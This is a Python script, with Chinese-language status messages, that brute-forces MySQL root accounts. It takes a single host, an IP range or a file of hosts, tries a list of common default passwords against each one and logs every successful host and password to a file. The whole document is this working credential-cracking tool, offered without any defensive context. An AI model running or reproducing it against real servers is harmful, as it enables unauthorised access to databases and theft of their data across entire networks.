import pymysql
import sys

userdb = ['root', 'toor', 'password', '123456', '123']
users = open('ok.txt', 'w+')


def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,
                            (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8,
                            num & 0x000000ff)


def get_ip(ip):
    start, end = [ip2num(x) for x in ip.split('-')]
    return [num2ip(num) for num in range(start, end + 1) if num & 0xff]


def mysqldbs(host, password):
    conn = pymysql.connect(host=host, user='root', passwd=password)
    i=0
    if conn:
        try:
            users.write("[+]IP:" + host +"用户名:root"+"\t密码:" + password)
            print("成功[IP:%s\t\t用户名:\troot \t\t密码:%s]" % (host, password))

            conn.close()
        except:
            pass


def mysqlusers(users):
    userss = get_ip(users)
    for ip in userss:
        for password in userdb:
            try:
                print (u"[+]破解中:%s:%s" % (ip.strip(), password))
                mysqldbs(ip, password)
            except:
                pass


def mysqluser(users):
    for password in userdb:
        try:
            print( u"[+]破解中:%s:%s" % (users.strip(), password))
            mysqldbs(users, password)
        except:
            pass


def mysqlfile(users):
    for ip in open(users, 'r'):
        for password in userdb:
            try:
                print(  u"[+]破解中:%s:%s" % (ip.strip(), password))
                mysqldbs(ip, password)
            except:
                pass


def main():
    help_l = u"""
                   
    """
    if len(sys.argv) < 2:
        print
        help_l
    else:
        if len(sys.argv) == 3:
            if sys.argv[1] == '-u':
                mysqluser(sys.argv[2])
            if sys.argv[1] == '-g':
                mysqlusers(sys.argv[2])
            if sys.argv[1] == '-G':
                mysqlfile(sys.argv[2])

        else:
            print
            help_l


if __name__ == '__main__':
    main()